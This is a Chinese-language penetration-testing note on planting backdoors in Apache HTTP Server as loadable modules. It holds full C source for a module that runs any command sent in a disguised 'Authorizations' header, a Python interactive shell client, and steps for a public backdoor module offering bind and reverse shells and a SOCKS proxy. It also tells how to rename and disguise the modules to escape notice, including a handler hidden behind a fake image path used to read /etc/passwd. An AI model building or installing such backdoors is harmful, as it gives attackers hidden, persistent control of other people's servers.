  #### Apache Module后门1
	From:https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor
	生成模板结构
	>apxs -g -n auth
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/620.png)
	
	编辑mod_auth.c文件
```c
#include "httpd.h"
#include "http_config.h"
#include "http_protocol.h"
#include "ap_config.h"
#include <stdio.h>
#include <stdlib.h>
static int auth_handler(request_rec *r)
{
    const apr_array_header_t    *fields;
    int                            i;
    apr_table_entry_t           *e = 0;
    char FLAG = 0;
    fields = apr_table_elts(r->headers_in);
    e = (apr_table_entry_t *) fields->elts;
    for(i = 0; i < fields->nelts; i++) {
        if(strcmp(e[i].key, "Authorizations") == 0){
            FLAG = 1;
            break;
        }
    }
    if (FLAG){
        char * command = e[i].val;
        FILE* fp = popen(command,"r");
        char buffer[0x100] = {0};
        int counter = 1;
        while(counter){
            counter = fread(buffer, 1, sizeof(buffer), fp);
            ap_rwrite(buffer, counter, r);
        }
        pclose(fp);
        return DONE;
    }
    return DECLINED;
}
static void auth_register_hooks(apr_pool_t *p)
{
    ap_hook_handler(auth_handler, NULL, NULL, APR_HOOK_MIDDLE);
}
module AP_MODULE_DECLARE_DATA auth_module = {
    STANDARD20_MODULE_STUFF, 
    NULL,                  /* create per-dir    config structures */
    NULL,                  /* merge  per-dir    config structures */
    NULL,                  /* create per-server config structures */
    NULL,                  /* merge  per-server config structures */
    NULL,                  /* table of config file commands       */
    auth_register_hooks  /* register hooks                      */
};

```
	编译后重启apache
	>apxs -i -a -c mod_auth.c && service apache2 restart
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/621.png)

	原文件接受的头是backdoor太明显，这里换成了Authorizations
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/622.png)
	
	或使用python来执行
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/623.png)
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import sys
def exploit(host, port, command):
    headers = {
        "Authorizations": command
    }
    url = "http://%s:%d/" % (host, port)
    response = requests.get(url, headers=headers)
    content = response.content
    print content
def main():
    if len(sys.argv) != 3:
        print "Usage : "
        print "\tpython %s [HOST] [PORT]" % (sys.argv[0])
        exit(1)
    host = sys.argv[1]
    port = int(sys.argv[2])
    while True:
        command = raw_input("$ ")
        if command == "exit":
            break
        exploit(host, port, command)
if __name__ == "__main__":
    main()

```
  #### Apache Module后门2
	From:https://github.com/VladRico/apache2_BackdoorMod
	.load文件传入/etc/apache2/mods-available/目录，.so文件传入/usr/lib/apache2/modules/目录
	启动后门模块，重启apache
	>a2enmod backdoor&service apache2 restart
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/624.png)

	Cookie里添加字段password=backdoor
	访问http://ip/ping返回如下图说明后门正常允许
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/625.png)

	访问http://ip/bind/12345 开启正向连接，攻击机执行nc ip 12345即可
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/626.png)

	访问http://ip/revtty/192.168.0.107/12138 开启反向连接，攻击机109执行nc监听12138即可
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/627.png)

	访问http://ip/proxy/1337开启socks代理
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/628.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/629.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/630.png)

	想要结束socks代理可执行
	>echo "imdonewithyou" |nc 192.168.0.111 1337
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/631.png)

	即可结束socks代理
	以上原作者的文件命名backdoor太明显，可以自己修改文件重新编译
	创建模板结构命名为phpmodev
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/632.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/633.png)

	修改cookie内容为迷惑字段Authorizations=PHPSESSIONID
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/634.png)
  #### Apache Module后门3
	From: https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247491179&idx=1&sn=ab26fe36ac74f5b140e91279ae8018c7
	生成模板结构
	>apxs -g -n phpdevmod
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/635.png)

	编辑mod_phpdevmod.c文件
	编译
	>make -e CC=x86_64-linux-gnu-g++
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/636.png)

	生成的.so文件在/.libs目录下
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/637.png)

	将其复制到/usr/lib/apache2/modules/目录
	修改/etc/apache2/mods-enabled/php7.0.load文件，添加如下
	LoadModule phpdevmod_module /usr/lib/apache2/modules/mod_phpdevmod.so
	<Location /qq.jpg>    #可以设置为任何不存在的文件
    	setHandler phpdevmod
	</Location>
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/638.png)

	需重启apache服务
	访问后门方式http://ip/qq.jpg?命令的url编码
	直接访问后门文件
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/639.png)

	636174202F6574632F706173737764为cat /etc/passwd的url编码
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/640.png)